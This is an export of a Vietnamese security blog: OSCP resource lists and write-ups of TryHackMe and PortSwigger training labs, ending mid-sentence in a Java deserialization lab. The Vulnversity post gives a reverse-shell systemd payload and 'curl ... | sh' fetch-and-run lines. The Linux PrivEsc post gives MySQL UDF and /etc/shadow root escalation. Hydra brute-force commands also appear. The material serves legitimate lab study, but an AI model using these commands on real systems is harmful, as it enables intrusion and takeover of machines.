[{"content":"Resources Adithyan AK\u0026rsquo;s personal notes: https://blog.adithyanak.com/oscp-preparation-guide/enumeration\nTJnull’s list updated list 2021 : https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0\nOSCP Journeys and Preparation guides:   https://medium.com/@parthdeshani/how-to-pass-oscp-like-boss-b269f2ea99d\n  https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html\n  https://medium.com/@calmhavoc/oscp-the-pain-the-pleasure-a506962baad\n  https://github.com/burntmybagel/OSCP-Prep\n  https://medium.com/@m4lv0id/and-i-did-oscp-589babbfea19\n  https://gr0sabi.github.io/security/oscp-insights-best-practices-resources/#note-taking\n  https://satiex.net/2019/04/10/offensive-security-certified-professional/amp/?__twitter_impression=true\n  https://hakin9.org/try-harder-my-penetration-testing-with-kali-linux-oscp-review-and-courselab-experience-my-oscp-review-by-jason-bernier/\n  https://theslickgeek.com/oscp/\n  http://dann.com.br/oscp-offensive-security-certification-pwk-course-review/\n  https://h0mbre.github.io/OSCP/#\n  https://prasannakumar.in/infosec/my-walk-towards-cracking-oscp/\n  https://infosecuritygeek.com/my-oscp-journey/\n  https://acknak.fr/en/articles/oscp-tools/\n  https://r3dg33k.com/2018-10-09-oscp-exp/\n  https://www.jimwilbur.com/oscp-links/\n  https://www.linkedin.com/pulse/road-oscp-oluwaseun-oyelude-oscp\n  https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html\n  https://blog.vonhewitt.com/2018/08/oscp-exam-cram-log-aug-sept-oct-2018/\n  https://jhalon.github.io/OSCP-Review/\n  https://www.alienvault.com/blogs/security-essentials/how-to-prepare-to-take-the-oscp\n  https://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/\n  https://thor-sec.com/review/oscp/oscp_review/\n  Cheatsheets :   https://github.com/P3t3rp4rk3r/OSCP-cheat-sheet-1?files=1\n  https://github.com/crsftw/oscp?files=1\n  https://github.com/crsftw\n  https://h4ck.co/wp-content/uploads/2018/06/cheatsheet.txt\n  https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html\n  https://jok3rsecurity.com/cheat-sheet/\n  https://github.com/UserXGnu/OSCP-cheat-sheet-1?files=1\n  https://archive.is/IZLjv\n  https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/\n  http://ramunix.blogspot.com/2016/10/oscp-cheat-sheet.html?m=1\n  http://0xc0ffee.io/blog/OSCP-Goldmine\n  https://hausec.com/pentesting-cheatsheet/\n  https://jordanpotti.com/oscp/\n  https://github.com/ucki/URP-T-v.01?files=1\n  https://blog.propriacausa.de/wp-content/uploads/2016/07/oscp_notes.html\n  https://zsahi.wordpress.com/oscp-notes-collection/\n  https://github.com/weaknetlabs/Penetration-Testing-Grimoire?files=1\n  https://github.com/OlivierLaflamme/Cheatsheet-God?files=1\n  https://medium.com/@cymtrick/oscp-cheat-sheet-5b8aeae085ad\n  Linux Privilege Escalation :‌   https://adithyanak.gitbook.io/oscp-2020/privilege-escalation\n  https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html\n  https://github.com/Ignitetechnologies/Privilege-Escalation\n  https://gtfobins.github.io/\n  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/\n  Linux Privesc Tools :‌   Linux Exploit Suggester\n  SUIDENUM\n  LinEnum.sh\n  linpeas.sh\n  Linprivchecker\n  pspy (crontabs)\n  Windows Privilege Escalation :   https://adithyanak.gitbook.io/oscp-2020/windows-privilege-escalation\n  https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html\n  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md\n  https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\n  http://www.fuzzysecurity.com/tutorials/16.html\n  https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation\n  https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n  Bonus:   https://github.com/0x4D31/awesome-oscp\n  https://github.com/security-prince/PWK-OSCP-Preparation-Roadmap\n  https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html\n  \rNguồn: https://infosecwriteups.com/how-i-passed-oscp-with-100-points-in-12-hours-without-metasploit-in-my-first-attempt-dc8d03366f33 \n","description":"Tài liệu về OSCP","id":0,"section":"posts","tags":["OSCP","",""],"title":"Awesome OSCP resources","uri":"https://ch1nhpd.github.io/posts/awesome-oscp-resources/"},{"content":"Chào các bạn, tiếp tục với các room trong TryHackMe list room from beginer, hôm nay chúng ta cùng đến với bài thực hành Vulnversity nhé!\nTrong bài này mình chỉ tập trung nói về Task 4 và 5 với những phần còn lại mình tin là các bạn hoàn toàn có thể tự tìm hiểu được.\nTask 4: Compromise the webserver Sau khi làm xong những task trước thì chúng ta thấy là server cho phép chúng ra upload file có phần mở rộng là .phtml và trong cái file đó chúng ta hoàn toàn có thể truyền code php vào để reverse shell. Tức là buộc server tạo một kết nối tới máy mình và cho phép mình thực hiện những lệnh hệ thống(shell).\nNhư tác giả đã cung cấp, chúng ta có thể lấy đoạn mã php đó tại đây. Copy đoạn mã vào và lưu dưới dạng .phtml để chúng ta có thể upload lên server.\nLưu ý là chúng ta phải sửa ip và port trong đoạn code thành ip và port của mình.\nNgoài ra nếu bạn sử dụng Kali thì có thể tìm các file reverse shell của nhiều ngôn ngữ khác nhau tại /usr/share/webshells.\nSau khi up load file thành công thì ta chạy lệnh:\n nc -lvnp port_number \n Rồi sau đó truy cập đến cái file mà chúng ta đã upload lên server để tạo reverse shell. Cái link để vào cũng được tác giả cung cấp như sau:\n http://ip:3333/internal/uploads/file_name.phtml\n Cuối cùng là vào khai thác để trả lời các câu hỏi của tác giả thôi\u0026hellip;\nTask 5: Privilege Escalation Ở phần này, nhiệm vụ của chúng ra là leo được lên thành root user nhờ vào systemctl và SUID. Để có thể làm được, trước tiên ta cần hiểu SUID là gì đã.\nHiểu đơn giản thì SUID là một loại quyền đặc biệt. Quyền này cho phép file được thực thi(executes) dưới quyền của chủ sở hữu nó cho dù người chạy file đó là bất kì ai. Khi một file được gắn quyền SUID thì bit x được thay thế thành bit s.\nTiếp theo là ta cần nắm được cách tìm kiếm những file được gắn quyền SUID để có thể tiếp tục khai thác.\n find / -perm /4000 -user root -type f 2\u0026gt; /dev/null \n Có thể hiểu lệnh này như sau:\n / : vị trí tìm kiếm file SUID -perm /4000: phân loại quyền. Ở đây /4000 là SUID, ngoài ra nếu SGID thì là /2000 và cả SUID,SGID thì dùng /6000 nhé -user root: là tìm kiếm theo username của người sở hữu file đó. -type f: chỉ định loại file tìm kiếm 2\u0026gt; /dev/null: Khi tìm kiếm bằng user bình thường thì có những thư mục mình ko thể truy cập vào được, nên nó sẽ hiện lỗi ra làm rối hết cả mắt. Vì vậy ta dùng lệnh này để ghi những cái lỗi đó vào /dev/null. Số 2 ở đây là nói đến những dòng lỗi, ngược lại nếu muốn ghi những dòng không lỗi vào đâu đó thì thay số 2 bằng số 1. Còn file /dev/null thì là một nơi mà mình ghi gì vào cũng được nhưng khi đọc thì nó không hiện ra cái gì hết.  Ta có thể tìm tên các file đó trên GTFOBins  thì thấy có thể leo root được bằng cách sử dụng systemctl.\nNói qua về systemctl thì: Systemctl là một tiện ích dòng lệnh, có nhiệm vụ điều khiển hệ thống systemd và service manager. Systemd là một bộ công cụ để quản lý hệ thống Linux, nó được sử dụng để khởi động máy, quản lý dịch vụ, hệ thống file tự động, ghi sự kiện, thiết lập tên máy chủ và các tác vụ hệ thống khác. Systemd sử dụng các khái niệm unit, package, service, socket.\rSystemctl được sử dụng để kiểm soát systemd và quản lý các dịch vụ. Nó là một phần của hệ sinh thái systemd và có sẵn theo mặc định trên tất cả các hệ thống.\rVới Systemctl bạn có thể kiểm tra được trạng thái của các service, khởi động và tắt service, gỡ rối hệ thống khi xảy ra sự cố.\r\r\nTheo GTFOBins thì ta có thể sử dụng payload sau để trở thành root user:\n1 2 3 4 5 6 7 8 9  sudo install -m =xs $(which systemctl) TF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;cat /root/root.txt \u0026gt; /tmp/output\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF   Lưu ý là ta có thể sửa đoạn cat /root/root.txt \u0026gt; /tmp/output thành bất kì lệnh nào ta muốn chạy trên server victim. Chúng ta có thể chạy từng dòng trong payload trên hoặc tạo file sẵn trong máy mình rồi gửi đến máy victim. Dưới đây là một số cách để gửi và chạy file payload:\n1 2 3 4 5 6 7 8 9 10 11  #Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/privEsc.sh | sh #Victim #Without curl sudo nc -q 5 -lvnp 80 \u0026lt; privEsc.sh #Host cat \u0026lt; /dev/tcp/10.10.10.10/80 | sh #Victim #Excute from memory and send output back to the host nc -lvnp 9002 | tee privEsc.out #Host curl 10.10.14.20:8000/privEsc.sh | sh | nc 10.10.14.20 9002 #Victim   Ngoài ra mình còn tìm thấy một cái payload cho phép mình điều khiển trực tiếp victim qua netcat như sau:\n1 2 3 4 5 6 7 8 9 10  [Unit] Description=root [Service] Type=simple User=root ExecStart=/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/Your_ip/port_nc 0\u0026gt;\u0026amp;1\u0026#39; [Install] WantedBy=multi-user.target   Vẫn thực hiện chuyển file payload đến máy victim rồi tại máy mình chạy lệnh sau:\n nc -nvlp port_nc \n Tại máy victim lần lượt chạy:\n systemctl enable root.service \nsystemctl start root \n Vậy là ta có thể điều khiểm máy victim dưới quyền root rồi\u0026hellip; Happy hacking \u0026lt;3\nTham khảo thêm  LinPEAS - Script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. GTFOBins  ","description":"Lưu ý về room Vulnersity","id":1,"section":"posts","tags":["Linux","Tryhackme",""],"title":"Vulnversity - TryHackMe room","uri":"https://ch1nhpd.github.io/posts/vulnversity/"},{"content":"Chào các bạn, tiếp tục với các room trong TryHackMe list room from beginer, hôm nay chúng ta cùng đến với Linux PrivEsc để tìm hiểu về Privilege Escalation trong Linux nhé!\nTask 1: Deploy the Vulnerable Debian VM Ở phần đầu tiên, chỉ đơn giản là cài đặt máy để kết nối tới máy ảo của họ(vulnerable Debian VM) để bắt đầu khai thác.\nChúng ta sẽ kết nối tới máy của họ qua giao thức ssh .\n ssh user@vulnerableVM_IP\n Task 2: Service Exploits Có nhiều Service chúng ta có thể khai thác nhưng trong bài này tác giả hướng chúng ta tới khai thác MySQL service qua UDFs ( User Defined Functions)\nLưu ý điều kiện là MySQL đang chạy dưới user \u0026ldquo;root\u0026rdquo; và user đó không đặt mật khẩu.\nĐể có thể khai thác ta cần biên dịch file raptor_udf2.c (Đã được cấp sẵn tại /home/user/tools/mysql-udf)\n gcc -g -c raptor_udf2.c -fPIC\n  gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n Tiếp theo kết nối tới mysql bằng lệnh\n mysql -u root\u0026lt;/span\n Rồi sau đó chạy đoạn lệnh sau để tạo ra một cái hàm (UDF) để chuẩn bị leo root. Mục đích của cái hàm này là lợi dụng mySQL để chạy lệnh của hệ thống dưới quyền root.(Vì mySQL đang đăng nhập bằng người dùng root)\n      use mysql;\rcreate table foo(line blob);\rinsert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));\rselect * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';\rcreate function do_system returns integer soname 'raptor_udf2.so';\r Sau khi tạo thành công hàm do_system ta chạy hàm đó để copy /bin/bash vào /tmp/rootbash và cấp cho nó SUID permission:\n select do_system(\u0026lsquo;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash\u0026rsquo;);\n Xong rồi thì mình cùng lên root thôi:\n /tmp/rootbash -p \n Task 3: Weak File Permissions - Readable /etc/shadow Trước hết ta cần nắm được là cái file /etc/shadow là nơi lưu giữ mật khẩu của tất cả các người dùng dưới dạng hash. Thường thì cái file này chỉ root user mới được đọc. Nhưng trong bài này thì ai cũng có thể đọc được cái file đó và như vậy thì đương nhiên là \u0026hellip;.\nKhi mình đã có quyền đọc cái file đấy thì việc cần làm là crack cái chuỗi hash để lấy được password. Ở đây người ta hướng dẫn chúng ra dùng một công cụ là john như sau:\n john \u0026ndash;wordlist=path_listPassword_file path_passWord_Hash_file \n Lưu ý: nhớ đọc kỹ hướng dẫn sử dụng trước khi dùng john nhé!\nTask 4: Weak File Permissions - Writable /etc/shadow Ở task 3 là chúng ta có quyền đọc thì đi crack còn nếu có thêm quyền sửa thì chúng ta chỉ cần hash một cái pass mới rồi thay thể vào hash của pass cũ là xong. Điều quan trọng là phải biết cái hash đó dùng thuật toán gì.(Như trong bài là sha-512)\nĐem ra so sánh thì việc crack password khó hơn nhiều so với việc xác định thật toán của hàm hash. Để xác định được thuật toán hash chúng ta có thể sử dụng một số tool như hash-identifier, hashid,\u0026hellip; hoặc một số tool online như hash-analyzer\nSau khi xác định được thuật toán hash thì các bạn có thể dùng lệnh sau để tạo ra chuỗi hash:\n mkpasswd -m hash_type newpasswordhere \n Cuối cùng là thay thế đoạn hash của root user trong /etc/shadow thành đoạn hash vừa tạo để cập nhật pass mới cho root.\nTask 5: Weak File Permissions - Writable /etc/passwd Ngoài file như đã nói ở task 3,4 thì còn một file nữa là /etc/passwd  cũng lưu hash của password. Tuy nhiên có một số máy không lưu ở file này. Và thường thì nó không lưu ở file này.\nViệc cần làm vẫn là loanh quanh như ở task 3 và 4. Đặc biệt, ở task này học được thêm một cách để tạo hash là:\n openssl passwd newpasswordhere \n Có một lưu ý là cái hash trong file này được lưu ở giữa dấu : thứ 1 và 2 và thường thì ở đấy nó để chữ x nhé!\nTask 6: [Đang cập nhật\u0026hellip;.]\n","description":"Cơ bản về nâng cấp đặc quyền trên Linux - Tryhackme Room","id":2,"section":"posts","tags":["Linux","Tryhackme",""],"title":"Linux PrivEsc","uri":"https://ch1nhpd.github.io/posts/linux-privesc/"},{"content":"Hai cái tool là Nikto và Zap.\nCả hai đều sử dụng để tìm kiểm những điểm yếu trang web.\nSublist3r: tìm ra các subdomain dựa vào các công cụ tìm kiếm như bing, gg, baidu,\u0026hellip;\nNgoài ra có một trang web để làm công việc tương tự\nHydra\nLà một cái tool để brute force password một số dịch vụ như ftp,ssh,webapp form,\u0026hellip;\nVD1: web app form\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.229.24 http-post-form \u0026quot;/login:username=^USER^\u0026amp;password=^PASS^:Your username or password is incorrect.\u0026quot; -V\nVD2: ssh\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.229.24 -t 4 ssh\n","description":"Note","id":3,"section":"notes","tags":["","",""],"title":"Web Scanning, Sublist3r, Hydra - TryHackMe","uri":"https://ch1nhpd.github.io/notes/roomwebscanning/"},{"content":"Giới thiệu Trước khi đến vơi Nmap thì chúng ta cần tìm hiểu về một khái niệm khác đó chính là port. Hẳn là bạn đã từng truy cập vào nhiều trang web cùng một lúc như vừa nhắn tin fb vừa nhắn tin telegram và bạn đã bao giờ tự hỏi tại sao tin nhắn đến từ fb lại ko nhảy sang telegram?\nTất nhiên là không thể nhảy lộn xộn như vậy được rồi vì mỗi khi gửi đi một request thì nó sẽ tự động mở một port để đánh dấu để khi response tương ứng sẽ vào đúng port đấy luôn. Và trên mỗi máy tính có đến 65535 (2^16) port trong đó có một số port được định nghĩa sẵn như:\n 80: http, 443: https, 21: ftp, 22: ssh, 23: telnet, \u0026hellip;.\n Còn chức năng chính của Nmap là xác định xem những port nào đang được mở để chúng ta có thể dễ dàng khai thác. Ngoài ra qua những đoạn scripts có sẵn của Nmap, chúng ta có thể dễ dàng tìm kiếm lỗ hỏng hoặc thậm chí là khai thác trực tiếp. Cùng nhau tìm hiểu tiếp qua các phần bên dưới nhé!\nCác kiểu Scan TCP connect Scans -sT Để hiểu được TCP connect scans, ta cần hiểu được quá trình bắt tay ba bước (three-way handshake) trong giao thức TCP.\n  Đầu tiên khi ta gửi một TCP request tới máy chủ mục tiêu với gói SYN.\n  Sau đó máy chủ xác nhận gói tin này với một phản hồi TCp có chứ SYN flag và ACK flag.\n  Cuối cùng, để hoàn thành quá trình bắt tay ba bước, máy của ta gủi một TCP request nữa tới server với ACK flag mà mình đã nhận.\n  TCP scan hoạt động bằng cách gửi TCP request với SYN flag tới mỗi port mình muốn của server và quan sát cách server phản hồi lại để xác định tình trạng đóng mở của port đó.\nNếu nhận được như trong bước hai của three-way handshake thì chứng tỏ port đó đang mở.\nCòn nếu nhận được RST(Reset) flag thì port đó đang đóng.\nTuy nhiên có một trường hợp đặc biệt xảy ra là ta không nhận được gì hết. Nguyên nhân là do các cổng đó đang được bảo vệ bởi tường lửa của đối phương. Việc cấu hình nên tường lửa như vậy thì cực kì đơn giản nhưng lại khiến ta rất khó có thể xác định chính xác mục tiêu. Đó được coi là một nhược điểm của TCP connect Scans.\nTrong trường hợp đó Nmap xác định port đó đang ở trạng thái filltered.\nSYN Scans -sS Giống như TCP Scans, SYN Scans cũng được dùng để scan TCP port. Chỉ có một chút khác biệt là ở bước 3, thay vì gửi ACK flag lại cho server thì SYN Scan lại gửi gói tin RST.\nViệc gửi RST thay vì ACK là vô cùng có lợi khi đứng ở vai trò là kẻ tấn công. Điều này giúp hacker có thể bypass được một số hệ thống phát hiện xâm nhập đời cũ bởi những hệ thống đó chỉ phát hiện khi quá trình bắt tay ba bước hoàn tất (như đã nói ở TCP Scans).\nKhông chỉ vậy, SYN Scans thường không được ghi nhật kí bởi các ứng dụng đang lắng nghe trên port đang mở, vì thông thường nó chỉ ghi lại kết quả khi kết nối được thiết lập đầy đủ(hoàn thành quá trình bắt tay 3 bước). Và như vậy SYN Scans thường được gọi là stealthy hay Half-open\nVì không cần bận tâm về việc hoàn thành và ngắt kết nối nên SYN Scans nhanh hơn đáng kể so với TCP Scans.\n Lưu ý\n- Khi dùng SYN Scans, chúng ta cần chạy dưới quyền sudo. Và SYN Scans cũng chính là kiểu mặc định khi ta chạy Nmap dưới quyền sudo.\n- Nếu không chạy sudo thì mặc định sẽ là TCP Scans\n UDP Scans -sU Đang cập nhật \u0026hellip;\nBài viết dựa trên: tryhackme Room\n","description":"Nmap cơ bản","id":4,"section":"posts","tags":["","",""],"title":"Nmap","uri":"https://ch1nhpd.github.io/posts/nmap/"},{"content":"TMUX\nLà một cái tool để sử dụng terminal một cách hiệu quả hơn. Một trong số chức năng tuyệt vời của nó là để khôi phục lại session trước đó. VD: khi đang ssh đến server mà bị mất mạng thì khi ssh lại nó sẽ khôi phục lại đúng cái lúc mình bị đá ra..\n","description":"note","id":5,"section":"notes","tags":["","",""],"title":"Note  Tmux","uri":"https://ch1nhpd.github.io/notes/tmux/"},{"content":"chuỗi \r--\rHack The Box Linux  October OpenAdmin Canape CronOS FriendZone Frolic Haircut Help Jarvis Joker Lame Nibbles Nineveh Poison RedCross Sunday  Windows  Netmon Jerry Devel Blue Bounty Optimum  VulnHub  Bob Brainpan GoldenEye NullByte Pluck Sedna  TryHackMe  Alfred Blue Brainstorm Corp HackPark Ignite Kenobi Skynet Steel Mountain Thompson  Bonus by TJNull (HTB)   Sniper\n  Conceal\n  Tally\n  Bankrobber — difficult but you’ll be able to practice with a specific exploitation which is VERY common in penetration testing world and which you won’t be able to get practice about, as far as I know, any other machine on HTB.\n  Active\n  SolidState\n  Fortune — quite more difficult and not in the list of TJNull but I’d add it. It gets you involved in many techniques that you will practice on OSCP.\n  Brainfuck —Only until you get a shell as user. Privesc is sick and not OSCP at all.\n  Bart\n  And here a bonus with some other boxes not much OSCP-like but that I also consider a must since you will exploit different kind of technologies widely used nowadays (some might also be involved in OSCP but their exploitation may not be the same):\n  Craft\n  Mango *\n  Forest *\n  Registry\n  Silo *\n  Monteverde\n  ","description":"tryhackme, hackthebox, vulnhub","id":6,"section":"posts","tags":["","",""],"title":"List lab OSCP","uri":"https://ch1nhpd.github.io/posts/lab-thm-htb-vulnhub/"},{"content":"Zoom này cho mình một cái ảnh, xong bắt mình tìm thông tin liên quan đến cái ảnh đó.\nĐầu tiên dùng exiftool tìm được chủ sở hữu của nó.\nTiếp theo tìm các thông tin liên quan đến người đó.\nCó web wigle.net giúp định vị, tìm thông tin liên quan đến bssid.\nNgoài ra còn biết thêm là khi view source thì ko chỉ để ý đến comment mà còn có cả những chỗ set màu trùng với background.\n","description":"Lý thuyết.","id":7,"section":"notes","tags":["","","TryHackMe"],"title":"OhSINT","uri":"https://ch1nhpd.github.io/notes/ohsint/"},{"content":"Level 1 - Intro  [👍] OpenVPN https://tryhackme.com/room/openvpn [👍] Welcome https://tryhackme.com/jr/welcome [👍] Intro to Researching https://tryhackme.com/room/introtoresearch [👍] The Hacker Methodology https://tryhackme.com/room/hackermethodology [👍] Learn Linux https://tryhackme.com/module/linux-fundamentals [⏳] Crash Course Pentesting https://tryhackme.com/room/ccpentesting  Introductory CTFs to get your feet wet  [👍] Google Dorking https://tryhackme.com/room/googledorking [👍] OHsint https://tryhackme.com/room/ohsint [⏳] Shodan.io https://tryhackme.com/room/shodan  Level 2 - Tooling  [👍] Tmux https://tryhackme.com/room/rptmux [👍] Nmap https://tryhackme.com/room/furthernmap [👍] Web Scanning https://tryhackme.com/room/rpwebscanning [👍] Sublist3r https://tryhackme.com/room/rpsublist3r [⏳] Metasploit https://tryhackme.com/room/rpmetasploit [👍] Hydra https://tryhackme.com/room/hydra [👍] Linux Privesc https://tryhackme.com/room/linuxprivesc [👍] RustScan (I invented RustScan so excuse the self-promo) https://tryhackme.com/room/rustscan  More introductory CTFs  [👍] Vulnversity - https://tryhackme.com/room/vulnversity Blue - https://tryhackme.com/room/blue [👍] Simple CTF https://tryhackme.com/room/easyctf [👍] Bounty Hacker https://tryhackme.com/room/cowboyhacker Brute It https://tryhackme.com/room/bruteit  Level 3 - Crypto \u0026amp; Hashes with CTF practice  [👍] Crack the hash https://tryhackme.com/room/crackthehash Agent Sudo https://tryhackme.com/room/agentsudoctf The Cod Caper https://tryhackme.com/room/thecodcaper Ice https://tryhackme.com/room/ice Lazy Admin https://tryhackme.com/room/lazyadmin Basic Pentesting https://tryhackme.com/room/basicpentestingjt  Level 4 - Web  OWASP top 10 https://tryhackme.com/room/owasptop10 Inclusion https://tryhackme.com/room/inclusion Injection https://tryhackme.com/room/injection Vulnversity https://tryhackme.com/room/vulnversity Basic Pentesting https://tryhackme.com/room/basicpentestingjt Juiceshop https://tryhackme.com/room/owaspjuiceshop Ignite https://tryhackme.com/room/ignite Overpass https://tryhackme.com/room/overpass Year of the Rabbit https://tryhackme.com/room/yearoftherabbit DevelPy https://tryhackme.com/room/bsidesgtdevelpy Jack of all trades https://tryhackme.com/room/jackofalltrades Bolt https://tryhackme.com/room/bolt  Level 5 - Reverse Engineering  Intro to x86 64 https://tryhackme.com/room/introtox8664 CC Ghidra https://tryhackme.com/room/ccghidra CC Radare2 https://tryhackme.com/room/ccradare2 CC Steganography https://tryhackme.com/room/ccstego Reverse Engineering https://tryhackme.com/room/reverseengineering Reversing ELF https://tryhackme.com/room/reverselfiles Dumping Router Firmware https://tryhackme.com/room/rfirmware  Level 6 - Networking  Introduction to Networking https://tryhackme.com/room/introtonetworking Smag Grotto https://tryhackme.com/room/smaggrotto Overpass 2 https://tryhackme.com/room/overpass2hacked  Level 7 - PrivEsc  Sudo Security Bypass https://tryhackme.com/room/sudovulnsbypass Sudo Buffer Overflow https://tryhackme.com/room/sudovulnsbof Windows Privesc Arena https://tryhackme.com/room/windowsprivescarena Linux Privesc Arena https://tryhackme.com/room/linuxprivescarena Windows Privesc https://tryhackme.com/room/windows10privesc Blaster https://tryhackme.com/room/blaster Ignite https://tryhackme.com/room/ignite Kenobi https://tryhackme.com/room/kenobi Capture the flag https://tryhackme.com/room/c4ptur3th3fl4g Pickle Rick https://tryhackme.com/room/picklerick  Level 8 - CTF practice  Post Exploitation Basics https://tryhackme.com/room/postexploit Inclusion https://tryhackme.com/room/inclusion Dogcat https://tryhackme.com/room/dogcat LFI basics https://tryhackme.com/room/lfibasics Buffer Overflow Prep https://tryhackme.com/room/bufferoverflowprep Overpass https://tryhackme.com/room/overpass Break out the cage https://tryhackme.com/room/breakoutthecage1 Lian Yu https://tryhackme.com/room/lianyu  Level 9 - Windows  Attacktive Directory https://tryhackme.com/room/attacktivedirectory Retro https://tryhackme.com/room/retro Blue Print https://tryhackme.com/room/blueprint Anthem https://tryhackme.com/room/anthem Relevant https://tryhackme.com/room/relevant  nguồn: anonyviet.com\n  ","description":"Các phòng lộ trình miễn phí và cực kỳ thú vị TryHackMe, từ không biết gì thành người có kiến thức và kỹ năng ở mức trung bình.","id":8,"section":"posts","tags":["tryhackme"],"title":"TryHackMe list room from beginer","uri":"https://ch1nhpd.github.io/posts/try-hack-me-list-room/"},{"content":"Server-side template injection là gì? ⏳\n  ","description":"Lý thuyết.","id":9,"section":"notes","tags":["web","Server-side template injection","PortSwigger Academy"],"title":"Server-side template injection","uri":"https://ch1nhpd.github.io/notes/server-side-template-injection/"},{"content":"Xin chào các bạn, hôm nay mình sẽ nói về một bài lab trên Web Security Academy. Bài này được họ đánh giá ở mức độ Expert nên khá là dài nhưng không khó lắm đâu nhé! Cá bạn có thể thực hành ngay tại đây.\nCùng bắt đầu ngay nhé Đầu tiên hãy bật Burp Suite lên, kết nối vào bài lab và đăng nhập vào tài khoản được cấp. Khi bạn dùng Burp để xem request đến /my-account các bạn sẽ thấy cookie của mình giống như hình dưới đây:\nBây giờ thử decode nó bằng tab decoder trong Burp nhé\nĐọc tiêu đề bài lab thì chúng ta có thể biết nó là Java deserialization nhưng nếu gặp thực tế thì chúng ta nhận biết thế nào? Hãy nhìn vào chỗ mình tô màu vàng trong decode nhé. Đoạn data.session.token.AccessTokenUser như kiểu đường dẫn của một class vậy, còn chữ java/lang kia nữa. Đó được coi là một trong những dấu hiệu giúp chúng ta nhận ra nhé.\nDiscover content Tiếp theo, sau khi discover content trang web mình thu được kết quả như ảnh dưới đây.\nChúng ta có thể nhìn thấy trang web để lộ hai file java. Hãy truy cập đến hai file đó ngay thôi nào..\nỞ file AccessTokenUser.java ta thấy class được implements Serializable. Và trùng hợp là cái tên class này có trong cái cookie mà chúng ta đã decode lúc nãy. Qua đây chúng ta có thể đoán được là khi server nhận cookie sẽ thực hiện deserializable để nhận được đối tượng.Rồi cứ để đó đã, chúng ta xem tiếp file còn lại có gì nào. À quên, các bạn có thể đọc về Serializable và deserializable tại đây nhé\nNhư các bạn thấy, class này cũng được implements từ Serializable, nghĩa là cũng có thể biến đổi từ object sang dạng byte stream. Nhưng class này chỉ biến đổi thuộc tính id vì Product đã được thêm transient. Để ý tiếp xuống dưới thì ta thấy hàm readObject có thực hiện một câu sql với đối số truyền vào là id.\nQua hai class thì chúng ta hãy thử tưởng tượng xem sẽ như thế nào nếu cái cookie không phải là đối tượng thuộc class 1 mà lại là đối tượng thuộc class 2 nhỉ. Liệu có thể có SQLi\u0026hellip;\nDeveloping a custom gadget chain Rồi, bây giờ chúng ta thử tạo class giống class 2 sau đó thực hiện biến đổi đối tượng sang dạng byte stream rồi encode dưới dạng Base64 để tạo ra một cookie giả nhé. Do sa chân lỡ bước mình đã không may va vào code của họ :))\nCác bạn cần chú ý hàm Main dưới đây nhé.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  import data.productcatalog.ProductTemplate; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; import java.util.Base64; class Main { public static void main(String[] args) throws Exception { ProductTemplate originalObject = new ProductTemplate(\u0026#34;gõ payload vào đây nhé - cái mà nó sẽ thay chỗ của id ấy\u0026#34;); String serializedObject = serialize(originalObject); System.out.println(\u0026#34;Serialized object: \u0026#34; + serializedObject); ProductTemplate deserializedObject = deserialize(serializedObject); System.out.println(\u0026#34;Deserialized object ID: \u0026#34; + deserializedObject.getId()); } private static String serialize(Serializable obj) throws Exception { ByteArrayOutputStream baos = new ByteArrayOutputStream(512); try (ObjectOutputStream out = new ObjectOutputStream(baos)) { out.writeObject(obj); } return Base64.getEncoder().encodeToString(baos.toByteArray()); } private static \u0026lt;T\u0026gt; T deserialize(String base64SerializedObj) throws Exception { try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) T obj = (T) in.readObject(); return obj; } } }   và class TemplateProduct có dạng\nSQLi Đầu tiên, mình thêm một dấu nháy đơn vào chỗ payload và chạy code sau đó sửa cookie gốc bằng kết quả code vừa chạy.\nVà đây là kết quả\nOke thế là bài toán bây giờ chính thức chuyển thành SQLi.\nMình đã thử và có vẻ chèn bất kì câu sql nào vào đều có thể chạy được. Vậy là dễ rồi, hãy xem mình làm tiếp thế nào nhé\u0026hellip;\nXác định số cột Mình dùng UNION vì vậy bước đầu tiên chính là xác định xem câu truy vấn gốc lấy ra bao nhiêu cột. Để xác định được thì các bạn cứ , null tiếp vào payload dưới đây của mình cho đến khi đúng thì thôi. Khi đấy số lượng từ null chính là số cột của câu truy vấn gốc.\n ' UNION SELECT null, null, null\n Xác định kiểu dữ liệu từng cột Để xác định kiểu dữ liệu của từng cột, chúng ta lại 